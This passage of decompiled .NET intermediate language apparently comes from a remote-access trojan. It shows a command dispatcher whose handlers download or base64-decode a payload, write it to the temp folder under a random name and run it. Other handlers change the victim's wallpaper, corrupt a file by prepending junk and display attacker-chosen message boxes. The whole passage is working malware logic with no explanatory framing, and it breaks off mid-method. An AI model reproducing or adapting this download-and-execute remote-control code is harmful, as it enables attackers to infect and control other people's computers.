             class [mscorlib]System.Exception V_57,
             class [mscorlib]System.IO.DriveInfo[] V_58,
             class [mscorlib]System.IO.DriveInfo V_59,
             class [mscorlib]System.Exception V_60,
             string[] V_61,
             string V_62,
             class [mscorlib]System.Exception V_63,
             int32 V_64,
             class [mscorlib]System.IO.MemoryStream V_65,
             class [mscorlib]System.Exception V_66,
             class [mscorlib]System.Exception V_67,
             class [mscorlib]System.Exception V_68,
             class [mscorlib]System.Exception V_69,
             class [mscorlib]System.Exception V_70,
             class [mscorlib]System.Exception V_71,
             uint8[] V_72,
             object V_73,
             int32 V_74,
             class [mscorlib]System.IO.MemoryStream V_75,
             uint8[] V_76,
             object V_77,
             int32 V_78,
             class [mscorlib]System.IO.MemoryStream V_79,
             class [System.Drawing]System.Drawing.Bitmap V_80,
             valuetype [System.Drawing]System.Drawing.Size V_81,
             valuetype [System.Drawing]System.Drawing.Rectangle V_82,
             class [System.Drawing]System.Drawing.Graphics V_83,
             class [System.Drawing]System.Drawing.Bitmap V_84,
             string V_85,
             class [mscorlib]System.IO.MemoryStream V_86,
             class [mscorlib]System.IO.MemoryStream V_87,
             class [mscorlib]System.Exception V_88,
             class [mscorlib]System.Exception V_89,
             int32 V_90,
             class [mscorlib]System.IO.MemoryStream V_91,
             class [mscorlib]System.Exception V_92,
             class [mscorlib]System.Exception V_93,
             class [mscorlib]System.Exception V_94,
             class [mscorlib]System.Exception V_95,
             class [mscorlib]System.Exception V_96,
             class [mscorlib]System.Exception V_97,
             object[] V_98,
             bool[] V_99,
             int32 V_100,
             int32 V_101,
             class [mscorlib]System.IO.MemoryStream V_102,
             class [mscorlib]System.Exception V_103,
             class [mscorlib]System.Exception V_104,
             class [mscorlib]System.Exception V_105,
             class [mscorlib]System.Exception V_106,
             string V_107,
             string[] V_108,
             int32 V_109,
             object[] V_110,
             object[] V_111,
             bool[] V_112,
             string V_113,
             string V_114,
             string V_115,
             int32 V_116,
             string[] V_117,
             int32 V_118,
             class [mscorlib]System.IO.DriveInfo[] V_119,
             int32 V_120,
             string[] V_121,
             string V_122,
             string V_123,
             int32 V_124,
             string[] V_125,
             int32 V_126,
             class [mscorlib]System.IO.DriveInfo[] V_127,
             int32 V_128,
             string[] V_129,
             string V_130,
             string V_131,
             valuetype [System.Drawing]System.Drawing.Rectangle V_132,
             valuetype [System.Drawing]System.Drawing.Rectangle V_133,
             valuetype [System.Drawing]System.Drawing.Rectangle V_134,
             valuetype [System.Drawing]System.Drawing.Rectangle V_135,
             string V_136,
             bool V_137,
             bool V_138)
    IL_0000:  nop
    IL_0001:  ldarga.s   b
    IL_0003:  call       string j.OK::BS(uint8[]&)
    IL_0008:  ldsfld     string j.OK::Y
    IL_000d:  ldc.i4.m1
    IL_000e:  ldc.i4.0
    IL_000f:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0014:  stloc.0
    IL_0015:  nop
    .try
    {
      IL_0016:  ldloc.0
      IL_0017:  ldc.i4.0
      IL_0018:  ldelem.ref
      IL_0019:  stloc.s    V_8
      IL_001b:  ldloc.s    V_8
      IL_001d:  stloc.s    V_9
      IL_001f:  nop
      IL_0020:  ldloc.s    V_9
      IL_0022:  stloc.s    V_107
      IL_0024:  nop
      IL_0025:  ldloc.s    V_107
      IL_0027:  ldstr      "rn"
      IL_002c:  ldc.i4.0
      IL_002d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  stloc.s    V_137
      IL_0037:  ldloc.s    V_137
      IL_0039:  brfalse    IL_014e

      IL_003e:  nop
      IL_003f:  ldnull
      IL_0040:  stloc.s    V_10
      IL_0042:  ldloc.0
      IL_0043:  ldc.i4.2
      IL_0044:  ldelem.ref
      IL_0045:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_004a:  ldstr      "http"
      IL_004f:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_0054:  ldc.i4.0
      IL_0055:  ceq
      IL_0057:  stloc.s    V_137
      IL_0059:  ldloc.s    V_137
      IL_005b:  brfalse.s  IL_006f

      IL_005d:  ldloc.0
      IL_005e:  ldc.i4.2
      IL_005f:  ldelem.ref
      IL_0060:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0065:  ldc.i4.0
      IL_0066:  call       uint8[] j.OK::ZIP(uint8[],
                                             bool)
      IL_006b:  stloc.s    V_10
      IL_006d:  br.s       IL_00e3

      IL_006f:  nop
      IL_0070:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0075:  stloc.s    V_12
      IL_0077:  ldloc.s    V_12
      IL_0079:  ldnull
      IL_007a:  ldstr      "DownloadData"
      IL_007f:  ldc.i4.1
      IL_0080:  newarr     [mscorlib]System.Object
      IL_0085:  stloc.s    V_110
      IL_0087:  ldloc.s    V_110
      IL_0089:  ldc.i4.0
      IL_008a:  ldloc.0
      IL_008b:  stloc.s    V_108
      IL_008d:  ldloc.s    V_108
      IL_008f:  ldc.i4.2
      IL_0090:  stloc.s    V_109
      IL_0092:  ldloc.s    V_109
      IL_0094:  ldelem.ref
      IL_0095:  stelem.ref
      IL_0096:  nop
      IL_0097:  ldloc.s    V_110
      IL_0099:  stloc.s    V_111
      IL_009b:  ldloc.s    V_111
      IL_009d:  ldnull
      IL_009e:  ldnull
      IL_009f:  ldc.i4.1
      IL_00a0:  newarr     [mscorlib]System.Boolean
      IL_00a5:  stloc.s    V_112
      IL_00a7:  ldloc.s    V_112
      IL_00a9:  ldc.i4.0
      IL_00aa:  ldc.i4.1
      IL_00ab:  stelem.i1
      IL_00ac:  ldloc.s    V_112
      IL_00ae:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00b3:  ldloc.s    V_112
      IL_00b5:  ldc.i4.0
      IL_00b6:  ldelem.i1
      IL_00b7:  brfalse.s  IL_00dc

      IL_00b9:  ldloc.s    V_108
      IL_00bb:  ldloc.s    V_109
      IL_00bd:  ldloc.s    V_111
      IL_00bf:  ldc.i4.0
      IL_00c0:  ldelem.ref
      IL_00c1:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_00c6:  ldtoken    [mscorlib]System.String
      IL_00cb:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_00d0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_00d5:  castclass  [mscorlib]System.String
      IL_00da:  stelem.ref
      IL_00db:  nop
      IL_00dc:  castclass  uint8[]
      IL_00e1:  stloc.s    V_10
      IL_00e3:  nop
      IL_00e4:  ldstr      "bla"
      IL_00e9:  call       bool j.OK::Send(string)
      IL_00ee:  pop
      IL_00ef:  ldc.i4.5
      IL_00f0:  newarr     [mscorlib]System.String
      IL_00f5:  stloc.s    V_108
      IL_00f7:  ldloc.s    V_108
      IL_00f9:  ldc.i4.0
      IL_00fa:  ldstr      "temp"
      IL_00ff:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_0104:  stelem.ref
      IL_0105:  nop
      IL_0106:  ldloc.s    V_108
      IL_0108:  ldc.i4.1
      IL_0109:  ldstr      "\\"
      IL_010e:  stelem.ref
      IL_010f:  nop
      IL_0110:  ldloc.s    V_108
      IL_0112:  ldc.i4.2
      IL_0113:  ldc.i4.s   10
      IL_0115:  call       string j.OK::RN(int32)
      IL_011a:  stelem.ref
      IL_011b:  nop
      IL_011c:  ldloc.s    V_108
      IL_011e:  ldc.i4.3
      IL_011f:  ldstr      "."
      IL_0124:  stelem.ref
      IL_0125:  nop
      IL_0126:  ldloc.s    V_108
      IL_0128:  ldc.i4.4
      IL_0129:  ldloc.0
      IL_012a:  ldc.i4.1
      IL_012b:  ldelem.ref
      IL_012c:  stelem.ref
      IL_012d:  nop
      IL_012e:  ldloc.s    V_108
      IL_0130:  call       string [mscorlib]System.String::Concat(string[])
      IL_0135:  stloc.s    V_11
      IL_0137:  ldloc.s    V_11
      IL_0139:  ldloc.s    V_10
      IL_013b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_0140:  nop
      IL_0141:  ldloc.s    V_11
      IL_0143:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0148:  pop
      IL_0149:  br         IL_17d9

      IL_014e:  nop
      IL_014f:  ldloc.s    V_107
      IL_0151:  ldstr      "TrocaaWallpaper"
      IL_0156:  ldc.i4.0
      IL_0157:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_015c:  ldc.i4.0
      IL_015d:  ceq
      IL_015f:  stloc.s    V_137
      IL_0161:  ldloc.s    V_137
      IL_0163:  brfalse    IL_0290

      IL_0168:  nop
      IL_0169:  ldnull
      IL_016a:  stloc.s    V_13
      IL_016c:  ldloc.0
      IL_016d:  ldc.i4.2
      IL_016e:  ldelem.ref
      IL_016f:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0174:  ldstr      "http"
      IL_0179:  callvirt   instance bool [mscorlib]System.String::StartsWith(string)
      IL_017e:  ldc.i4.0
      IL_017f:  ceq
      IL_0181:  stloc.s    V_137
      IL_0183:  ldloc.s    V_137
      IL_0185:  brfalse.s  IL_0199

      IL_0187:  ldloc.0
      IL_0188:  ldc.i4.2
      IL_0189:  ldelem.ref
      IL_018a:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_018f:  ldc.i4.0
      IL_0190:  call       uint8[] j.OK::ZIP(uint8[],
                                             bool)
      IL_0195:  stloc.s    V_13
      IL_0197:  br.s       IL_020d

      IL_0199:  nop
      IL_019a:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_019f:  stloc.s    V_15
      IL_01a1:  ldloc.s    V_15
      IL_01a3:  ldnull
      IL_01a4:  ldstr      "DownloadData"
      IL_01a9:  ldc.i4.1
      IL_01aa:  newarr     [mscorlib]System.Object
      IL_01af:  stloc.s    V_111
      IL_01b1:  ldloc.s    V_111
      IL_01b3:  ldc.i4.0
      IL_01b4:  ldloc.0
      IL_01b5:  stloc.s    V_108
      IL_01b7:  ldloc.s    V_108
      IL_01b9:  ldc.i4.2
      IL_01ba:  stloc.s    V_109
      IL_01bc:  ldloc.s    V_109
      IL_01be:  ldelem.ref
      IL_01bf:  stelem.ref
      IL_01c0:  nop
      IL_01c1:  ldloc.s    V_111
      IL_01c3:  stloc.s    V_110
      IL_01c5:  ldloc.s    V_110
      IL_01c7:  ldnull
      IL_01c8:  ldnull
      IL_01c9:  ldc.i4.1
      IL_01ca:  newarr     [mscorlib]System.Boolean
      IL_01cf:  stloc.s    V_112
      IL_01d1:  ldloc.s    V_112
      IL_01d3:  ldc.i4.0
      IL_01d4:  ldc.i4.1
      IL_01d5:  stelem.i1
      IL_01d6:  ldloc.s    V_112
      IL_01d8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_01dd:  ldloc.s    V_112
      IL_01df:  ldc.i4.0
      IL_01e0:  ldelem.i1
      IL_01e1:  brfalse.s  IL_0206

      IL_01e3:  ldloc.s    V_108
      IL_01e5:  ldloc.s    V_109
      IL_01e7:  ldloc.s    V_110
      IL_01e9:  ldc.i4.0
      IL_01ea:  ldelem.ref
      IL_01eb:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01f0:  ldtoken    [mscorlib]System.String
      IL_01f5:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_01fa:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_01ff:  castclass  [mscorlib]System.String
      IL_0204:  stelem.ref
      IL_0205:  nop
      IL_0206:  castclass  uint8[]
      IL_020b:  stloc.s    V_13
      IL_020d:  nop
      IL_020e:  ldstr      "bla"
      IL_0213:  call       bool j.OK::Send(string)
      IL_0218:  pop
      IL_0219:  ldc.i4.5
      IL_021a:  newarr     [mscorlib]System.String
      IL_021f:  stloc.s    V_108
      IL_0221:  ldloc.s    V_108
      IL_0223:  ldc.i4.0
      IL_0224:  ldstr      "temp"
      IL_0229:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
      IL_022e:  stelem.ref
      IL_022f:  nop
      IL_0230:  ldloc.s    V_108
      IL_0232:  ldc.i4.1
      IL_0233:  ldstr      "\\"
      IL_0238:  stelem.ref
      IL_0239:  nop
      IL_023a:  ldloc.s    V_108
      IL_023c:  ldc.i4.2
      IL_023d:  ldc.i4.s   10
      IL_023f:  call       string j.OK::RN(int32)
      IL_0244:  stelem.ref
      IL_0245:  nop
      IL_0246:  ldloc.s    V_108
      IL_0248:  ldc.i4.3
      IL_0249:  ldstr      "."
      IL_024e:  stelem.ref
      IL_024f:  nop
      IL_0250:  ldloc.s    V_108
      IL_0252:  ldc.i4.4
      IL_0253:  ldloc.0
      IL_0254:  ldc.i4.1
      IL_0255:  ldelem.ref
      IL_0256:  stelem.ref
      IL_0257:  nop
      IL_0258:  ldloc.s    V_108
      IL_025a:  call       string [mscorlib]System.String::Concat(string[])
      IL_025f:  stloc.s    V_14
      IL_0261:  ldloc.s    V_14
      IL_0263:  ldloc.s    V_13
      IL_0265:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_026a:  nop
      IL_026b:  nop
      .try
      {
        IL_026c:  ldc.i4.s   20
        IL_026e:  ldc.i4.0
        IL_026f:  ldloca.s   V_14
        IL_0271:  ldc.i4.1
        IL_0272:  call       int32 j.OK::SystemParametersInfo(int32,
                                                              int32,
                                                              string&,
                                                              int32)
        IL_0277:  pop
        IL_0278:  leave.s    IL_028a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_027a:  dup
        IL_027b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0280:  stloc.s    V_16
        IL_0282:  nop
        IL_0283:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0288:  leave.s    IL_028a

      }  // end handler
      IL_028a:  nop
      IL_028b:  br         IL_17d9

      IL_0290:  nop
      IL_0291:  ldloc.s    V_107
      IL_0293:  ldstr      "[claen]"
      IL_0298:  ldc.i4.0
      IL_0299:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_029e:  ldc.i4.0
      IL_029f:  ceq
      IL_02a1:  stloc.s    V_137
      IL_02a3:  ldloc.s    V_137
      IL_02a5:  brfalse.s  IL_02ec

      IL_02a7:  nop
      IL_02a8:  ldstr      "wAyqsW4eE9Csd0dndY1rLnufPtO4Vjp9cRvXz0g38RaWjeoo1O"
      + "BXT0CNp4wW7vY4Ti6Sm64zhnEn0QWHcVTGZrnNHcc9JFDNGAPYCzPWwyDPIDBsdg067E8ne"
      + "wVoWRj7TON9roebC3m0iW9oGJ73CM4UelTtjctQvxt2QqpXATVVvAKpibp7qcoiRV9Vmves"
      + "42mYUI42"
      IL_02ad:  stloc.s    V_17
      IL_02af:  ldloc.0
      IL_02b0:  ldc.i4.1
      IL_02b1:  ldelem.ref
      IL_02b2:  newobj     instance void [mscorlib]System.IO.StreamReader::.ctor(string)
      IL_02b7:  stloc.s    V_19
      IL_02b9:  ldloc.s    V_19
      IL_02bb:  callvirt   instance string [mscorlib]System.IO.StreamReader::ReadToEnd()
      IL_02c0:  stloc.s    V_18
      IL_02c2:  ldloc.s    V_19
      IL_02c4:  callvirt   instance void [mscorlib]System.IO.StreamReader::Close()
      IL_02c9:  nop
      IL_02ca:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_02cf:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_02d4:  ldloc.0
      IL_02d5:  ldc.i4.1
      IL_02d6:  ldelem.ref
      IL_02d7:  ldloc.s    V_17
      IL_02d9:  ldloc.s    V_18
      IL_02db:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_02e0:  ldc.i4.0
      IL_02e1:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::WriteAllText(string,
                                                                                                                               string,
                                                                                                                               bool)
      IL_02e6:  nop
      IL_02e7:  br         IL_17d9

      IL_02ec:  nop
      IL_02ed:  ldloc.s    V_107
      IL_02ef:  ldstr      "EnviarPermisaaaoMensagem"
      IL_02f4:  ldc.i4.0
      IL_02f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_02fa:  ldc.i4.0
      IL_02fb:  ceq
      IL_02fd:  stloc.s    V_137
      IL_02ff:  ldloc.s    V_137
      IL_0301:  brfalse    IL_044e

      IL_0306:  nop
      IL_0307:  nop
      IL_0308:  ldloc.0
      IL_0309:  ldc.i4.1
      IL_030a:  ldelem.ref
      IL_030b:  stloc.s    V_113
      IL_030d:  nop
      IL_030e:  ldloc.s    V_113
      IL_0310:  ldstr      "1"
      IL_0315:  ldc.i4.0
      IL_0316:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_031b:  ldc.i4.0
      IL_031c:  ceq
      IL_031e:  stloc.s    V_138
      IL_0320:  ldloc.s    V_138
      IL_0322:  brfalse.s  IL_032e

      IL_0324:  nop
      IL_0325:  ldc.i4.s   64
      IL_0327:  stloc.s    V_20
      IL_0329:  nop
      IL_032a:  br.s       IL_038f

      IL_032c:  br.s       IL_038f

      IL_032e:  nop
      IL_032f:  ldloc.s    V_113
      IL_0331:  ldstr      "2"
      IL_0336:  ldc.i4.0
      IL_0337:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_033c:  ldc.i4.0
      IL_033d:  ceq
      IL_033f:  stloc.s    V_138
      IL_0341:  ldloc.s    V_138
      IL_0343:  brfalse.s  IL_034f

      IL_0345:  nop
      IL_0346:  ldc.i4.s   32
      IL_0348:  stloc.s    V_20
      IL_034a:  nop
      IL_034b:  br.s       IL_038f

      IL_034d:  br.s       IL_038f

      IL_034f:  nop
      IL_0350:  ldloc.s    V_113
      IL_0352:  ldstr      "3"
      IL_0357:  ldc.i4.0
      IL_0358:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_035d:  ldc.i4.0
      IL_035e:  ceq
      IL_0360:  stloc.s    V_138
      IL_0362:  ldloc.s    V_138
      IL_0364:  brfalse.s  IL_0370

      IL_0366:  nop
      IL_0367:  ldc.i4.s   48
      IL_0369:  stloc.s    V_20
      IL_036b:  nop
      IL_036c:  br.s       IL_038f

      IL_036e:  br.s       IL_038f

      IL_0370:  nop
      IL_0371:  ldloc.s    V_113
      IL_0373:  ldstr      "4"
      IL_0378:  ldc.i4.0
      IL_0379:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_037e:  ldc.i4.0
      IL_037f:  ceq
      IL_0381:  stloc.s    V_138
      IL_0383:  ldloc.s    V_138
      IL_0385:  brfalse.s  IL_038f

      IL_0387:  nop
      IL_0388:  ldc.i4.s   16
      IL_038a:  stloc.s    V_20
      IL_038c:  nop
      IL_038d:  br.s       IL_038f

      IL_038f:  nop
      IL_0390:  ldloc.0
      IL_0391:  ldc.i4.2
      IL_0392:  ldelem.ref
      IL_0393:  stloc.s    V_21
      IL_0395:  ldloc.s    V_21
      IL_0397:  ldstr      "1"
      IL_039c:  ldc.i4.0
      IL_039d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03a2:  ldc.i4.0
      IL_03a3:  ceq
      IL_03a5:  stloc.s    V_138
      IL_03a7:  ldloc.s    V_138
      IL_03a9:  brfalse.s  IL_03b3

      IL_03ab:  ldc.i4.4
      IL_03ac:  stloc.s    V_22
      IL_03ae:  br         IL_0438

      IL_03b3:  ldloc.s    V_21
      IL_03b5:  ldstr      "2"
      IL_03ba:  ldc.i4.0
      IL_03bb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03c0:  ldc.i4.0
      IL_03c1:  ceq
      IL_03c3:  stloc.s    V_138
      IL_03c5:  ldloc.s    V_138
      IL_03c7:  brfalse.s  IL_03ce

      IL_03c9:  ldc.i4.3
      IL_03ca:  stloc.s    V_22
      IL_03cc:  br.s       IL_0438

      IL_03ce:  ldloc.s    V_21
      IL_03d0:  ldstr      "3"
      IL_03d5:  ldc.i4.0
      IL_03d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03db:  ldc.i4.0
      IL_03dc:  ceq
      IL_03de:  stloc.s    V_138
      IL_03e0:  ldloc.s    V_138
      IL_03e2:  brfalse.s  IL_03e9

      IL_03e4:  ldc.i4.0
      IL_03e5:  stloc.s    V_22
      IL_03e7:  br.s       IL_0438

      IL_03e9:  ldloc.s    V_21
      IL_03eb:  ldstr      "4"
      IL_03f0:  ldc.i4.0
      IL_03f1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_03f6:  ldc.i4.0
      IL_03f7:  ceq
      IL_03f9:  stloc.s    V_138
      IL_03fb:  ldloc.s    V_138
      IL_03fd:  brfalse.s  IL_0404

      IL_03ff:  ldc.i4.1
      IL_0400:  stloc.s    V_22
      IL_0402:  br.s       IL_0438

      IL_0404:  ldloc.s    V_21
      IL_0406:  ldstr      "5"
      IL_040b:  ldc.i4.0
      IL_040c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0411:  ldc.i4.0
      IL_0412:  ceq
      IL_0414:  stloc.s    V_138
      IL_0416:  ldloc.s    V_138
      IL_0418:  brfalse.s  IL_041f

      IL_041a:  ldc.i4.5
      IL_041b:  stloc.s    V_22
      IL_041d:  br.s       IL_0438

      IL_041f:  ldloc.s    V_21
      IL_0421:  ldstr      "6"
      IL_0426:  ldc.i4.0
      IL_0427:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_042c:  ldc.i4.0
      IL_042d:  ceq
      IL_042f:  stloc.s    V_138
      IL_0431:  ldloc.s    V_138
      IL_0433:  brfalse.s  IL_0438

      IL_0435:  ldc.i4.2
      IL_0436:  stloc.s    V_22
      IL_0438:  nop
      IL_0439:  ldloc.0
      IL_043a:  ldc.i4.4
      IL_043b:  ldelem.ref
      IL_043c:  ldloc.0
      IL_043d:  ldc.i4.3
      IL_043e:  ldelem.ref
      IL_043f:  ldloc.s    V_22
      IL_0441:  ldloc.s    V_20
      IL_0443:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_0448:  pop
      IL_0449:  br         IL_17d9

      IL_044e:  nop
      IL_044f:  ldloc.s    V_107
      IL_0451:  ldstr      "EnviarPermisaaaoMensagem"
      IL_0456:  ldc.i4.0
      IL_0457:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_045c:  ldc.i4.0
      IL_045d:  ceq
      IL_045f:  stloc.s    V_138
      IL_0461:  ldloc.s    V_138
      IL_0463:  brfalse    IL_0631

      IL_0468:  nop
      IL_0469:  nop
      IL_046a:  ldloc.0
      IL_046b:  ldc.i4.1
      IL_046c:  ldelem.ref
      IL_046d:  stloc.s    V_114
      IL_046f:  nop
      IL_0470:  ldloc.s    V_114
      IL_0472:  ldstr      "1"
      IL_0477:  ldc.i4.0
      IL_0478:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_047d:  ldc.i4.0
      IL_047e:  ceq
      IL_0480:  stloc.s    V_137
      IL_0482:  ldloc.s    V_137
      IL_0484:  brfalse.s  IL_048d

      IL_0486:  nop
      IL_0487:  ldc.i4.s   64
      IL_0489:  stloc.s    V_25
      IL_048b:  br.s       IL_04e5

      IL_048d:  nop
      IL_048e:  ldloc.s    V_114
      IL_0490:  ldstr      "2"
      IL_0495:  ldc.i4.0
      IL_0496:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_049b:  ldc.i4.0
      IL_049c:  ceq
      IL_049e:  stloc.s    V_138
      IL_04a0:  ldloc.s    V_138
      IL_04a2:  brfalse.s  IL_04ab

      IL_04a4:  nop
      IL_04a5:  ldc.i4.s   32
      IL_04a7:  stloc.s    V_25
      IL_04a9:  br.s       IL_04e5

      IL_04ab:  nop
      IL_04ac:  ldloc.s    V_114
      IL_04ae:  ldstr      "3"
      IL_04b3:  ldc.i4.0
      IL_04b4:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04b9:  ldc.i4.0
      IL_04ba:  ceq
      IL_04bc:  stloc.s    V_138
      IL_04be:  ldloc.s    V_138
      IL_04c0:  brfalse.s  IL_04c9

      IL_04c2:  nop
      IL_04c3:  ldc.i4.s   48
      IL_04c5:  stloc.s    V_25
      IL_04c7:  br.s       IL_04e5

      IL_04c9:  nop
      IL_04ca:  ldloc.s    V_114
      IL_04cc:  ldstr      "4"
      IL_04d1:  ldc.i4.0
      IL_04d2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04d7:  ldc.i4.0
      IL_04d8:  ceq
      IL_04da:  stloc.s    V_138
      IL_04dc:  ldloc.s    V_138
      IL_04de:  brfalse.s  IL_04e5

      IL_04e0:  nop
      IL_04e1:  ldc.i4.s   16
      IL_04e3:  stloc.s    V_25
      IL_04e5:  nop
      IL_04e6:  nop
      IL_04e7:  ldloc.0
      IL_04e8:  ldc.i4.2
      IL_04e9:  ldelem.ref
      IL_04ea:  stloc.s    V_115
      IL_04ec:  nop
      IL_04ed:  ldloc.s    V_115
      IL_04ef:  ldstr      "1"
      IL_04f4:  ldc.i4.0
      IL_04f5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_04fa:  ldc.i4.0
      IL_04fb:  ceq
      IL_04fd:  stloc.s    V_138
      IL_04ff:  ldloc.s    V_138
      IL_0501:  brfalse.s  IL_050c

      IL_0503:  nop
      IL_0504:  ldc.i4.4
      IL_0505:  stloc.s    V_24
      IL_0507:  br         IL_059b

      IL_050c:  nop
      IL_050d:  ldloc.s    V_115
      IL_050f:  ldstr      "2"
      IL_0514:  ldc.i4.0
      IL_0515:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_051a:  ldc.i4.0
      IL_051b:  ceq
      IL_051d:  stloc.s    V_138
      IL_051f:  ldloc.s    V_138
      IL_0521:  brfalse.s  IL_0529

      IL_0523:  nop
      IL_0524:  ldc.i4.3
      IL_0525:  stloc.s    V_24
      IL_0527:  br.s       IL_059b

      IL_0529:  nop
      IL_052a:  ldloc.s    V_115
      IL_052c:  ldstr      "3"
      IL_0531:  ldc.i4.0
      IL_0532:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0537:  ldc.i4.0
      IL_0538:  ceq
      IL_053a:  stloc.s    V_138
